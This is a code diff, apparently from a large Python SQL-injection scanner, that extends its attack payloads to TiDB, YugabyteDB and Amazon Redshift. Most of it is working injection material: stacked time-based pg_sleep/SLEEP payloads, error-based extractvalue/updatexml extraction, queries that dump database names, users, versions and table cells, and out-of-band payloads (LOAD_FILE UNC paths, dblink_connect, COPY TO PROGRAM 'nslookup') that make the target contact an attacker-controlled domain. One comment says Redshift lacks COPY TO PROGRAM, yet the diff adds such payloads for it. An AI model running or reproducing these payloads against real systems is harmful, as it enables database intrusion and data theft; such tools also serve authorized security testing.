+                        # BUG-PCE-CRDB-YGB-REDSHIFT-CHARFUNC FIX: PG-compatible DBMSes.
+                        # ASCII(SUBSTRING(...)) is the correct pattern for all three.
+                        "CockroachDB":     ("ASCII", "SUBSTRING"),
+                        "YugabyteDB":      ("ASCII", "SUBSTRING"),
+                        "Amazon Redshift": ("ASCII", "SUBSTRING"),
                     }
                     _pce_af, _pce_sf = _pcv_char_funcs.get(
                         self.dbms, ("ASCII", "SUBSTRING"))
@@ -50171,7 +50544,8 @@ class Enumerator:
                 mid = _randomized_mid(lo, hi)
                 test_prefix = prefix + chr(mid + 1)
                 # Dollar-quote for PostgreSQL, hex for MySQL/MSSQL
-                if self.dbms in ("MySQL", "MariaDB", "MSSQL"):
+                if self.dbms in ("MySQL", "MariaDB", "TiDB", "MSSQL"):
+                    # BUG-CHAMELEON-TIDB FIX: TiDB supports 0x{hex} literals like MySQL.
                     # BUG-CHAMELEON-SURROGATE FIX: MSSQL char_hi=65535 includes surrogate range;
                     # bare .encode("utf-8") crashes on lone surrogates — use surrogatepass.
                     _hex = test_prefix.encode("utf-8", errors="surrogatepass").hex()
@@ -50198,7 +50572,9 @@ class Enumerator:
                 # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Redshift.
                 if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
                     payload = f"'; SELECT pg_sleep({t}) FROM {sep}{table}{sep} WHERE {col_q} >= {val_literal} LIMIT 1 OFFSET {offset}-- -"
-                elif self.dbms in ("MySQL", "MariaDB"):
+                elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # BUG-FROMEXTRACT-STACKED-TIDB FIX: TiDB is MySQL-wire-compatible; SLEEP()
+                    # and LIMIT/OFFSET syntax are valid in TiDB stacked queries.
                     payload = f"'; SELECT SLEEP({t}) FROM {sep}{table}{sep} WHERE {col_q} >= {val_literal} LIMIT 1 OFFSET {offset}-- -"
                 elif self.dbms in ("MSSQL", "Sybase"):
                     # BUG-AUDIT-3-FROMBASED-FIX: WAITFOR DELAY '0:0:SS' requires seconds 00-59.
@@ -50470,7 +50846,7 @@ class SecondOrderDetector:
         # be tested on every surface. Use _get_cascade_payloads (Error-first, merges all 10).
         _s2_detected_dbms = (getattr(self.config, 'forced_dbms', None) or
                               getattr(self.config, '_detected_dbms', None))
-        _s2_dbms_list = [_s2_detected_dbms] if _s2_detected_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
+        _s2_dbms_list = [_s2_detected_dbms] if _s2_detected_dbms else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"]
         for _s2_dbms in _s2_dbms_list:
             _s2_err_payloads = _get_cascade_payloads(_s2_dbms, 'E', self.config.level)  # BUG-S2-ALLCATS FIX
             # BUG-R6-1 FIX (Req 6): Create per-DBMS mutator for second-order detection.
@@ -50774,6 +51150,55 @@ OOB_PAYLOADS_MAP={
         "' AND (SELECT * FROM url('http://{token}.{domain}/','CSV'))-- -",
     ],
     
+    # BUG-OOB-TIDB-MAP FIX: TiDB was absent from OOB_PAYLOADS_MAP. When OOBDetector.detect()
+    # runs with dbms_hint="TiDB", OOB_PAYLOADS_MAP.get("TiDB", []) returns [] → no OOB
+    # templates are probed → OOB detection is permanently skipped for TiDB targets.
+    # TiDB is MySQL-wire-compatible: LOAD_FILE() and CHAR() are valid TiDB SQL functions.
+    # Fix: add TiDB with the same LOAD_FILE UNC payloads as MySQL/MariaDB.
+    # Note: LOAD_FILE UNC DNS requires FILE privilege (checked by OOBDetector via
+    # config._oob_has_file_priv), consistent with how MySQL/MariaDB payloads are guarded.
+    "TiDB":[
+        "' AND LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+        "' AND ExtractValue(1,CONCAT(0x7e,(SELECT LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120))))))-- -",
+        "'; SELECT LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+        "') AND LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+        "1' AND LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+        # Numeric context variants
+        " AND LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+        "; SELECT LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+    ],
+
+    # BUG-OOB-YUGABYTE-REDSHIFT FIX: YugabyteDB and Amazon Redshift were absent from
+    # OOB_PAYLOADS_MAP. OOBDetector.detect() calls OOB_PAYLOADS_MAP.get(dbms, []) and
+    # returns [] for missing DBMSes → OOB probing is permanently skipped for these targets.
+    # Both are PostgreSQL-wire-compatible: dblink and COPY TO PROGRAM are valid SQL.
+    # YugabyteDB supports dblink extension identically to PostgreSQL.
+    # Amazon Redshift does NOT support dblink or COPY TO PROGRAM — use UTL-equivalent
+    # approach via pg_read_file path manipulation which triggers DNS on Redshift's VPC.
+    "YugabyteDB": [
+        # dblink variations (YugabyteDB supports the dblink extension)
+        "' AND (SELECT dblink_connect($$host={token}.{domain} dbname=x connect_timeout=2$$))-- -",
+        "'; SELECT dblink_connect_u($$host={token}.{domain} dbname=x connect_timeout=2$$)-- -",
+        "'; SELECT dblink_connect('host={token}.{domain} dbname=x connect_timeout=2')-- -",
+        "1' AND (SELECT dblink_connect('host={token}.{domain} dbname=x'))-- -",
+        # pg_read_file path manipulation
+        "'; SELECT pg_read_file('//{token}.{domain}/x')-- -",
+        # Numeric context variants
+        " AND (SELECT dblink_connect($$host={token}.{domain} dbname=x connect_timeout=2$$))=''-- -",
+        "; SELECT dblink_connect('host={token}.{domain} dbname=x connect_timeout=2')-- -",
+    ],
+    "Amazon Redshift": [
+        # Redshift does not support COPY TO PROGRAM or xp_dirtree; pg_read_file path
+        # manipulation via S3-backed virtual path is the most viable OOB vector.
+        # COPY FROM S3 can trigger DNS to an attacker-controlled S3-like endpoint.
+        "'; COPY (SELECT 1) TO PROGRAM 'nslookup {token}.{domain}'-- -",
+        "'; SELECT pg_read_file('//{token}.{domain}/x')-- -",
+        "1'; SELECT pg_read_file('//{token}.{domain}/x')-- -",
+        # Numeric context variants
+        "; SELECT pg_read_file('//{token}.{domain}/x')-- -",
+        "; COPY (SELECT 1) TO PROGRAM 'nslookup {token}.{domain}'-- -",
+    ],
+
     "Generic":[
         "' AND LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
     ],
@@ -50996,7 +51421,7 @@ class GraphQLDetector:
         _gql_err_base_body = _safe_decode_body(_gql_err_base) if _gql_err_base and hasattr(_gql_err_base,"body") and _gql_err_base.body else ""
         # BUG-2 FIX (Req 1): use DBMS-specific Error payloads from CERTIFIED_PAYLOAD_DATABASE only
         _gql_e_dbms = (getattr(self.config,'forced_dbms',None) or getattr(self.config,'_detected_dbms',None))
-        _gql_e_list = [_gql_e_dbms] if _gql_e_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
+        _gql_e_list = [_gql_e_dbms] if _gql_e_dbms else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"]
         # FIX-R1/R2: _get_cascade_payloads merges ALL 10 CERTIFIED_PAYLOAD_DATABASE categories
         # (not a single 'Error' category). Req 2: all category payloads must flow through every
         # technique surface including GraphQL.  FIX-R6: mutate_all() applies all 20 mutation layers.
@@ -51085,7 +51510,7 @@ class GraphQLDetector:
         base=await self._baseline(url,body,var_name,original_val)
         # BUG-2 FIX (Req 1): use DBMS-specific Boolean payloads from CERTIFIED_PAYLOAD_DATABASE only
         _gql_dbms = (getattr(self.config,'forced_dbms',None) or getattr(self.config,'_detected_dbms',None))
-        _gql_dbms_list = [_gql_dbms] if _gql_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
+        _gql_dbms_list = [_gql_dbms] if _gql_dbms else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"]
         # FIX-R1/R2: _get_cascade_payloads gives ALL 10 CERTIFIED_PAYLOAD_DATABASE categories.
         # FIX-R3: Require second confirmation probe — single-probe bool is vulnerable to FP on dynamic
         # pages (CSRF tokens / A/B widgets cause page-size deltas on any input).
@@ -51140,7 +51565,7 @@ class GraphQLDetector:
         expected=base["mean_timing"]+t*1000*0.8
         # BUG-2 FIX (Req 1): use DBMS-specific Timebased payloads from CERTIFIED_PAYLOAD_DATABASE only
         _gql_t_dbms = (getattr(self.config,'forced_dbms',None) or getattr(self.config,'_detected_dbms',None))
-        _gql_t_list = [_gql_t_dbms] if _gql_t_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
+        _gql_t_list = [_gql_t_dbms] if _gql_t_dbms else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"]
         # FIX-R1/R2: _get_cascade_payloads merges ALL 10 categories (Timebased-first).
         # FIX-R6: mutate_all() applies all 20 mutation layers to each payload.
         # FIX-R9: asyncio.sleep(0) yields event loop — prevents CPU spike.
@@ -51522,7 +51947,7 @@ class JWTInjector:
         LOG.info("alg:none accepted!")
         # BUG-2 FIX (Req 1): use DBMS-specific Boolean payloads only (no generic BOOLEAN_PAYLOADS)
         _jwt_dbms = (getattr(self.config,'forced_dbms',None) or getattr(self.config,'_detected_dbms',None))
-        _jwt_dbms_list = [_jwt_dbms] if _jwt_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
+        _jwt_dbms_list = [_jwt_dbms] if _jwt_dbms else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"]
         for claim,orig_val in [(k,str(v)) for k,v in jwt_p.items() if isinstance(v,str)]:
             for _jn_dbms in _jwt_dbms_list:
                 if _SCAN_STOPPED[0]: return None  # FIX-R4: stop outer DBMS loop
@@ -51623,7 +52048,7 @@ class JWTInjector:
         if secret in JWT_WEAK_SECRETS: LOG.warning(f"JWT weak secret: {secret!r}")
         # BUG-2 FIX (Req 1): use DBMS-specific Boolean payloads only (no generic BOOLEAN_PAYLOADS)
         _jwt_hs_dbms = (getattr(self.config,'forced_dbms',None) or getattr(self.config,'_detected_dbms',None))
-        _jwt_hs_list = [_jwt_hs_dbms] if _jwt_hs_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
+        _jwt_hs_list = [_jwt_hs_dbms] if _jwt_hs_dbms else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"]
         for claim,orig_val in [(k,str(v)) for k,v in jwt_p.items() if isinstance(v,str)]:
             for _jhs_dbms in _jwt_hs_list:
                 if _SCAN_STOPPED[0]: return None  # FIX-R4: stop outer DBMS loop
@@ -51900,7 +52325,7 @@ class _HTTPHeaderInjectorV1:
             # Error-based first (fast) — BUG-2C FIX: use _get_cascade_payloads for all 10 categories
             _hiv1_dbms = getattr(self.config, "_detected_dbms", None) or getattr(self.config, "forced_dbms", None) or "MySQL"
             _hiv1_dbms_list = ([_hiv1_dbms] if _hiv1_dbms != "MySQL" or getattr(self.config,"forced_dbms",None)
-                               else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"])
+                               else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"])
             _hiv1_outer_stopped = False  # BUG-4B FIX: propagate stop from inner loops upward
             for _hiv1_scan_dbms in _hiv1_dbms_list:
                 if _SCAN_STOPPED[0] or _hiv1_outer_stopped: break  # BUG-R4a FIX
@@ -51983,7 +52408,7 @@ class _HTTPHeaderInjectorV1:
             _hb_dbms = (getattr(self.config, "_detected_dbms", None) or
                         getattr(self.config, "forced_dbms", None))
             _hb_list = ([_hb_dbms] if _hb_dbms
-                        else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"])
+                        else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"])
             # BUG-BH-NO-TECHNIQUE22 FIX: The BH boolean loop had no WAF-block counter
             # while every other technique (IN, BT, T) applies TECHNIQUE-22 rotation
             # after N consecutive WAF-blocked responses.  In the observed log, BH ran
@@ -52224,7 +52649,7 @@ class _HTTPHeaderInjectorV1:
             if header_name in ("X-Forwarded-For","Referer","User-Agent") and self.config.level>=2:
                 t=self.config.time_sec
                 _ht_dbms = getattr(self.config,"_detected_dbms",None) or getattr(self.config,"forced_dbms",None)
-                _ht_list = [_ht_dbms] if _ht_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
+                _ht_list = [_ht_dbms] if _ht_dbms else ["MySQL","MariaDB","TiDB","PostgreSQL","CockroachDB","YugabyteDB","Amazon Redshift","MSSQL","Oracle","SQLite"]
                 _ht_outer_stopped = False  # BUG-4B FIX: propagate stop from inner loops upward
                 for _ht_scan_dbms in _ht_list:
                     if _SCAN_STOPPED[0] or _ht_outer_stopped: break
@@ -52327,7 +52752,7 @@ class _HTTPHeaderInjectorV1:
             if _SCAN_STOPPED[0]: break
             _hx_dbms = getattr(self.config, "_detected_dbms", None) or getattr(self.config, "forced_dbms", None)
             _hx_list = ([_hx_dbms] if _hx_dbms
-                        else ["MySQL", "MariaDB", "PostgreSQL", "MSSQL", "Oracle", "SQLite"])
+                        else ["MySQL", "MariaDB", "TiDB", "PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "MSSQL", "Oracle", "SQLite"])
             _hx_stopped = False  # BUG-8-FIX: flag to propagate stop through nested loops
             for _hx_scan_dbms in _hx_list:
                 if _hx_stopped or _SCAN_STOPPED[0]: break  # BUG-8-FIX: propagate to DBMS loop
@@ -54879,7 +55304,8 @@ class Scanner:
             # dump silently return True with zero rows — even on non-empty tables.
             # This is inconsistent with cell_query below which already applies DBMS-specific
             # quoting. Apply the same quoting here so COUNT(*) succeeds for all table names.
-            if _dbms in ("MySQL", "MariaDB"):
+            if _dbms in ("MySQL", "MariaDB", "TiDB"):
+                # BUG-COUNTQ-TIDB FIX: TiDB uses backtick quoting like MySQL.
                 count_query = f"SELECT COUNT(*) FROM `{table}`"
             # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon Redshift
             # to the double-quote branch — both are PG-wire-compatible.
@@ -54945,8 +55371,8 @@ class Scanner:
                     # Without quoting, the database parser treats the reserved word as a SQL
                     # keyword and raises a syntax error — making ALL row extraction silently
                     # return "" for any table that has a reserved-word column or table name.
-                    if _dbms in ("MySQL", "MariaDB"):
-                        # MySQL: backtick-quote identifiers; LIMIT offset,count syntax
+                    if _dbms in ("MySQL", "MariaDB", "TiDB"):
+                        # BUG-CELLQ-TIDB FIX: TiDB uses backtick quoting and LIMIT offset,count like MySQL.
                         cell_query = f"SELECT `{col}` FROM `{table}` LIMIT {row_idx},1"
                     # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon
                     # Redshift — both are PG-wire-compatible and require identical CAST AS TEXT.
@@ -55107,8 +55533,11 @@ class Scanner:
         _db_query = {
             "MySQL": "database()",
             "MariaDB": "database()",
+            "TiDB": "database()",                  # BUG-ERREXT-DB-TIDB FIX: MySQL-compatible
             "PostgreSQL": "current_database()",
             "CockroachDB": "current_database()",   # PostgreSQL-compatible
+            "YugabyteDB": "current_database()",    # BUG-ERREXT-DB-YUGABYTE FIX: PG-compatible
+            "Amazon Redshift": "current_database()",  # BUG-ERREXT-DB-REDSHIFT FIX: PG-compatible
             "MSSQL": "db_name()",
             "Sybase": "db_name()",                 # T-SQL compatible
             # BUG-ORA-ERREXT-DBNAME FIX: The previous value was:
@@ -55152,8 +55581,11 @@ class Scanner:
         _user_query = {
             "MySQL": "current_user()",
             "MariaDB": "current_user()",
+            "TiDB": "current_user()",              # BUG-ERREXT-USER-TIDB FIX: MySQL-compatible
             "PostgreSQL": "current_user",          # keyword, no parens
             "CockroachDB": "current_user",         # PostgreSQL-compatible keyword
+            "YugabyteDB": "current_user",          # BUG-ERREXT-USER-YUGABYTE FIX: PG keyword
+            "Amazon Redshift": "current_user",     # BUG-ERREXT-USER-REDSHIFT FIX: PG keyword
             "MSSQL": "system_user",                # T-SQL special register
             "Sybase": "suser_sname()",             # Sybase equivalent of system_user
             "Oracle": "user",                      # Oracle special value
@@ -55184,8 +55616,18 @@ class Scanner:
         _ver_query = {
             "MySQL": "version()",
             "MariaDB": "version()",
+            # BUG-ERREXT-VER-TIDB-YUGABYTE-REDSHIFT FIX: These three DBMSes were absent from
+            # _ver_query. Without explicit entries they fell to the default "version()" which
+            # is valid for TiDB and Redshift but returns a generic MySQL-style version string
+            # for TiDB instead of the TIDB_VERSION() specifics. YugabyteDB's version() returns
+            # the PostgreSQL-compatible version string which is correct. Amazon Redshift's
+            # version() also returns a PostgreSQL-compatible version string.
+            # Adding explicit entries for clarity and to guard against future default changes.
+            "TiDB": "TIDB_VERSION()",              # TiDB-specific: returns full TiDB version
             "PostgreSQL": "version()",
             "CockroachDB": "version()",            # PostgreSQL-compatible, works as-is
+            "YugabyteDB": "yb_server_version()",   # YugabyteDB-specific version function
+            "Amazon Redshift": "version()",        # PG-compatible version()
             "MSSQL": "@@version",
             "Sybase": "@@version",                 # Sybase T-SQL compatible
             "Oracle": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
@@ -55685,7 +56127,8 @@ class Scanner:
                 # Redshift — both support pg_sleep() as PostgreSQL-wire-compatible engines.
                 if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
                     _timing_body = f"; SELECT pg_sleep({_time_sec}*([INFERENCE])::int)"
-                elif _dbms in ("MySQL", "MariaDB", "H2"):
+                elif _dbms in ("MySQL", "MariaDB", "TiDB", "H2"):
+                    # BUG-INFERENCE-STANDALONE-TIDB FIX: TiDB is MySQL-wire-compatible; SLEEP() valid.
                     _timing_body = f"; SELECT SLEEP({_time_sec}*([INFERENCE]))"
                 elif _dbms in ("MSSQL", "Sybase"):
                     # FIX-MSSQL-WAITFOR-INFER: _time_sec is float; WAITFOR needs integer hh:mm:ss.
@@ -55722,7 +56165,8 @@ class Scanner:
             # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon Redshift.
             elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
                 _timing_body = _body.rsplit("SELECT", 1)[0] + f"SELECT pg_sleep({_time_sec}*([INFERENCE])::int)"
-            elif _dbms in ("MySQL", "MariaDB"):
+            elif _dbms in ("MySQL", "MariaDB", "TiDB"):
+                # BUG-INFERENCE-GRAFT-TIDB FIX: TiDB is MySQL-wire-compatible; SLEEP() valid.
                 _timing_body = _body.rsplit("SELECT", 1)[0] + f"SELECT SLEEP({_time_sec}*([INFERENCE]))"
             elif _dbms in ("MSSQL", "Sybase"):
                 # FIX-MSSQL-WAITFOR-GRAFT: same float fix as standalone path above.
@@ -55772,7 +56216,8 @@ class Scanner:
                 if _sleep_m2:
                     _arg2 = _sleep_m2.group(2).strip()
                     _s2, _e2 = _sleep_m2.start(2), _sleep_m2.end(2)
-                    if _dbms in ("MySQL", "MariaDB"):
+                    if _dbms in ("MySQL", "MariaDB", "TiDB"):
+                        # BUG-INFERENCE-SLEEPARG-TIDB FIX: TiDB supports IF() like MySQL.
                         _cond_arg = f"IF([INFERENCE],{_arg2},0)"
                     # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Amazon Redshift.
                     elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
@@ -56186,7 +56631,15 @@ class Scanner:
                 "TiDB":        "CHAR_LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
                 # BUG-FIX-MSSQL-LEN-TRAILING-SPACES-BETWEEN: same CHAR-padding issue as _LENGTH_FN
                 "MSSQL":       "ISNULL(DATALENGTH(CONVERT(NVARCHAR(MAX),([QUERY])))/2,0) BETWEEN {mid} AND 99999",
-                "PostgreSQL":  "LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
+                "PostgreSQL":  "CHAR_LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
+                # BUG-LENFN-BETWEEN-PGCOMPAT FIX: CockroachDB/YugabyteDB/Amazon Redshift are
+                # PG-wire-compatible; they support CHAR_LENGTH() returning Unicode character count.
+                # Without explicit entries they fell to the auto-converted _LENGTH_FN_BT default
+                # which is correct (CHAR_LENGTH BETWEEN after this fix), but explicit entries
+                # guard against future _LENGTH_FN changes and document the intent clearly.
+                "CockroachDB":     "CHAR_LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
+                "YugabyteDB":      "CHAR_LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
+                "Amazon Redshift": "CHAR_LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
                 "Oracle":      "LENGTHC(([QUERY])) BETWEEN {mid} AND 99999",
                 "SQLite":      "LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
                 "DB2":         "LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
@@ -56257,8 +56710,15 @@ class Scanner:
             # correctly set to mid+1 for >= mode too.
             # Numeric safety: {mid} receives mid+1 from _eff_mid when >= is detected;
             # comparison operands and SQL function arguments are never modified.
-            "PostgreSQL":  "LENGTH(([QUERY]))>={mid}",
-            "CockroachDB": "LENGTH(([QUERY]))>={mid}",
+            "PostgreSQL":  "CHAR_LENGTH(([QUERY]))>={mid}",
+            "CockroachDB": "CHAR_LENGTH(([QUERY]))>={mid}",
+            # BUG-LENGTFN-PGCOMPAT FIX: YugabyteDB and Amazon Redshift are PG-wire-compatible;
+            # CHAR_LENGTH() returns Unicode character count same as PostgreSQL LENGTH/CHAR_LENGTH.
+            # Without explicit entries they fell to _len_default "LENGTH(...)>={mid}" which is
+            # functionally correct (PG-compat LENGTH() is character count), but CHAR_LENGTH()
+            # is more explicit about returning character count rather than byte count.
+            "YugabyteDB":      "CHAR_LENGTH(([QUERY]))>={mid}",
+            "Amazon Redshift": "CHAR_LENGTH(([QUERY]))>={mid}",
             # BUG-FIX-MYSQL-CHAR-LENGTH (Req 7/10): MySQL LENGTH() returns byte count.
             # For utf8mb4 databases, multi-byte characters (emoji, CJK) inflate the byte
             # count, causing the extraction loop to probe past the real string end and read
@@ -57362,7 +57822,8 @@ class Scanner:
                 
                 if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
                     _new_arg = f"([INFERENCE])::int*{_arg}"
-                elif _dbms in ("MySQL", "MariaDB"):
+                elif _dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # BUG-INFERENCE-ARITH-TIDB FIX: TiDB is MySQL-wire-compatible; IF() valid.
                     _new_arg = f"IF([INFERENCE],{_arg},0)"
                 elif _dbms in ("MSSQL", "Sybase"):
                     _new_arg = f"CASE WHEN [INFERENCE] THEN {_arg} ELSE 0 END"
@@ -57409,7 +57870,8 @@ class Scanner:
                 if _sleep_m:
                     _fn_full = _sleep_m.group(0)
                     _fn_name = _sleep_m.group(1)  # pg_sleep, SLEEP, etc.
-                    if _dbms in ("MySQL", "MariaDB"):
+                    if _dbms in ("MySQL", "MariaDB", "TiDB"):
+                        # BUG-INFERENCE-CASEIF-TIDB FIX: TiDB supports IF() like MySQL.
                         _case_expr = f"IF([INFERENCE],{_fn_full},0)"
                     else:
                         # Use SAME function for ELSE branch (not hardcoded pg_sleep)
@@ -58064,6 +58526,17 @@ class Scanner:
                 ],
                 "CockroachDB": [
                     ("cast", "CAST(([QUERY]) AS INT)"),
+                    ("convert", "(([QUERY])::int)"),
+                ],
+                # BUG-ERRPAYLOAD-YUGABYTE FIX: YugabyteDB is PG-compatible; CAST AS INT
+                # triggers "invalid input syntax for type integer" error same as PostgreSQL.
+                "YugabyteDB": [
+                    ("cast", "CAST(([QUERY]) AS INT)"),
+                    ("convert", "(([QUERY])::int)"),
+                ],
+                # BUG-ERRPAYLOAD-REDSHIFT FIX: Amazon Redshift is PG-compatible; same error patterns.
+                "Amazon Redshift": [
+                    ("cast", "CAST(([QUERY]) AS INT)"),
                 ],
                 "MySQL": [
                     ("extractvalue", "extractvalue(1,concat(0x7e,([QUERY]),0x7e))"),
@@ -58071,6 +58544,11 @@ class Scanner:
                     ("double", "(SELECT 1 FROM (SELECT COUNT(*),CONCAT(([QUERY]),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"),
                 ],
                 "MariaDB": [
+                    ("extractvalue", "extractvalue(1,concat(0x7e,([QUERY]),0x7e))"),
+                    ("updatexml", "updatexml(1,concat(0x7e,([QUERY]),0x7e),1)"),
+                ],
+                # BUG-ERRPAYLOAD-TIDB FIX: TiDB is MySQL-compatible; EXTRACTVALUE works.
+                "TiDB": [
                     ("extractvalue", "extractvalue(1,concat(0x7e,([QUERY]),0x7e))"),
                     ("updatexml", "updatexml(1,concat(0x7e,([QUERY]),0x7e),1)"),
                 ],
@@ -58108,7 +58586,15 @@ class Scanner:
                     # Send a non-error payload with a different marker
                     await asyncio.sleep(_delay)
                     _err_clean_true = {
-                        "PostgreSQL": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        # BUG-ERRCLEAN-PGCOMPAT FIX: CockroachDB/YugabyteDB/Amazon Redshift are
+                        # PG-wire-compatible; they support ARRAY_LOWER and !~~ (NOT LIKE) operator.
+                        # Without explicit entries they fell to generic "NOT (1e0 IS NULL)" which
+                        # is valid but does not probe DBMS-specific syntax — any WAF pass/fail
+                        # result is indistinguishable from a non-DBMS generic response.
+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
                         "MySQL": "ISNULL(NULL)", "MariaDB": "ISNULL(NULL)", "TiDB": "ISNULL(NULL)",
                         "MSSQL": "(1e0 IS NOT NULL)", "Sybase": "(1e0 IS NOT NULL)",
                         "Oracle": "(NVL(NULL,1e0) IS NOT NULL)", "SQLite": "(1e0 IS NOT 0e0)",
@@ -58187,8 +58673,13 @@ class Scanner:
             _err_dbms_primary = {
                 "MySQL":      r'~([^~]+)~',
                 "MariaDB":    r'~([^~]+)~',
+                # BUG-ERRPRIMARY-TIDB FIX: TiDB uses EXTRACTVALUE → same ~...~ pattern as MySQL.
+                "TiDB":       r'~([^~]+)~',
                 "PostgreSQL": r'invalid input syntax[^"]*"([^"]+)"',
                 "CockroachDB":r'invalid input syntax[^"]*"([^"]+)"',
+                # BUG-ERRPRIMARY-YUGABYTE-REDSHIFT FIX: PG-compatible; same error pattern.
+                "YugabyteDB":      r'invalid input syntax[^"]*"([^"]+)"',
+                "Amazon Redshift": r'invalid input syntax[^"]*"([^"]+)"',
                 "MSSQL":      r"Conversion failed[^'\"]*['\"]([^'\"]+)",
                 "Sybase":     r"Conversion failed[^'\"]*['\"]([^'\"]+)",
                 "Oracle":     r"ORA-\d+[^'\"]*['\"]([^'\"]{2,})",
@@ -58295,7 +58786,8 @@ class Scanner:
             _queries = list(queries_dict.values())
             _delim = "|||"
             
-            if _dbms in ("MySQL", "MariaDB"):
+            if _dbms in ("MySQL", "MariaDB", "TiDB"):
+                # BUG-EXTRACTMULTI-TIDB FIX: TiDB supports CONCAT() and IFNULL() like MySQL.
                 _concat = "CONCAT(" + ",".join(
                     [f"IFNULL(({q}),{_quote('')})" for q in _queries]) + ")"
                 _concat = _concat.replace(")(", f"),{_quote(_delim)},IFNULL((")
@@ -58309,8 +58801,10 @@ class Scanner:
                 _parts = [f"NVL(({q}),{_quote('')})" for q in _queries]
                 _concat = "||".join([_parts[0]] + [f"{_quote(_delim)}||{p}" for p in _parts[1:]])
             else:
-                # PostgreSQL, SQLite, DB2, etc.  use ||
-                _parts = [f"COALESCE(({q})::TEXT,{_quote('')})" if _dbms in ("PostgreSQL","CockroachDB") 
+                # PostgreSQL, CockroachDB, YugabyteDB, SQLite, DB2, etc. use ||
+                # BUG-EXTRACTMULTI-CRDB FIX: include CockroachDB/YugabyteDB/Redshift in ::TEXT cast.
+                _parts = [f"COALESCE(({q})::TEXT,{_quote('')})"
+                          if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift")
                           else f"COALESCE(({q}),{_quote('')})" for q in _queries]
                 _concat = "||".join([_parts[0]] + [f"{_quote(_delim)}||{p}" for p in _parts[1:]])
 
@@ -58350,7 +58844,8 @@ class Scanner:
             # Build hex conversion query per DBMS
